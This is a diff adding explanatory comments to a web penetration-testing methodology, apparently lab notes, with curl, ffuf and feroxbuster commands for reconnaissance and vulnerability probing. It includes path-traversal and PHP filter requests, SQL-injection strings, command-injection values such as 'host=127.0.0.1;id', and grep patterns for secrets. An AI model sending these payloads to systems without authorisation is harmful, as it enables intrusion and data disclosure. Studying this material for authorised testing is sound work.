@@ -3,6 +3,7 @@
 ### Establish the application baseline
 
 ```bash
+# Fingerprint the web server, headers, methods, and initial response
 curl -kI "$URL"
 curl -ks "$URL" | tee web/index.html
 whatweb -a 3 "$URL"
@@ -12,6 +13,7 @@ nmap -Pn -p "$PORT" --script http-title,http-headers,http-methods "$IP"
 Build requests explicitly when reproducing application behavior:
 
 ```bash
+# Reproduce authenticated, cookie-based, and JSON requests explicitly
 curl -ksS -D web/headers.txt -o web/body.html "$URL"
 curl -ksS -X OPTIONS -i "$URL"
 curl -ksS -u "$USER:$PASS" "$URL/protected"
@@ -29,6 +31,7 @@ Extract names from redirects and TLS certificates, add confirmed names to
 `/etc/hosts`, and test virtual hosts.
 
 ```bash
+# Extract certificate names and fuzz virtual-host routing
 openssl s_client -connect "$IP:443" -servername example.local </dev/null 2>/dev/null \
   | openssl x509 -noout -subject -issuer -ext subjectAltName
 
@@ -45,6 +48,7 @@ Filter using a measured baseline response rather than copying an arbitrary size.
 ### Content discovery
 
 ```bash
+# Discover directories and common backup or source-file extensions
 feroxbuster -u "$URL" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
   -x php,asp,aspx,jsp,txt,bak,zip -o web/ferox.txt
 
@@ -65,6 +69,7 @@ configuration files, and upload locations.
 ### Parameter discovery
 
 ```bash
+# Discover hidden GET and POST parameter names
 ffuf -u "$URL/page?FUZZ=test" \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac
 
@@ -87,6 +92,7 @@ expected suffixes.
 ```
 
 ```bash
+# Reproduce path traversal and PHP source disclosure requests
 curl -ksG "$URL/download" --data-urlencode 'file=../../../../etc/passwd'
 curl -ks "$URL/index.php?page=php://filter/convert.base64-encode/resource=index.php"
 ```
@@ -109,6 +115,7 @@ Start with a harmless marker file. Confirm retrieval before attempting a
 server-side payload.
 
 ```bash
+# Upload a harmless marker before testing executable file types
 printf 'upload-marker\n' > web/marker.txt
 curl -ksS -F 'file=@web/marker.txt;type=text/plain' "$URL/upload"
 curl -ksS -F 'avatar=@web/marker.txt' -b cookies.txt "$URL/profile"
@@ -131,6 +138,7 @@ Begin with manual tests and compare response status, length, content, and timing
 ```
 
 ```bash
+# Compare SQL-injection response behavior using controlled predicates
 curl -ksG "$URL/item" --data-urlencode "id=1' AND '1'='2'-- -"
 curl -ksS "$URL/search" -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode "q=test' ORDER BY 2-- -"
@@ -152,6 +160,7 @@ $(id)
 ```
 
 ```bash
+# Test reflected and time-based command execution with harmless commands
 curl -ksG "$URL/ping" --data-urlencode 'host=127.0.0.1;id'
 curl -ksG "$URL/ping" --data-urlencode 'host=127.0.0.1;sleep 5' \
   -o /dev/null -w 'total=%{time_total}\n'
@@ -169,6 +178,7 @@ after understanding which layer blocks the raw input.
 - Re-run content discovery with authenticated cookies or headers.
 
 ```bash
+# Authenticate once, save cookies, and enumerate the protected application
 curl -ksS -c cookies.txt -d "username=$USER&password=$PASS" "$URL/login"
 ffuf -u "$URL/FUZZ" -b "$(awk 'NF && $1 !~ /^#/{printf "%s=%s;",$6,$7}' cookies.txt)" \
   -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ac
@@ -181,6 +191,7 @@ unsafe process execution, file operations, deserialization, and authorization
 checks.
 
 ```bash
+# Search available source and Git history for secrets and dangerous operations
 rg -n -i 'password|secret|token|api[_-]?key|connection|string' .
 rg -n 'exec\(|system\(|popen\(|subprocess|ProcessBuilder|Runtime\.getRuntime' .
 rg -n 'upload|download|readFile|sendFile|deserialize|unserialize' .
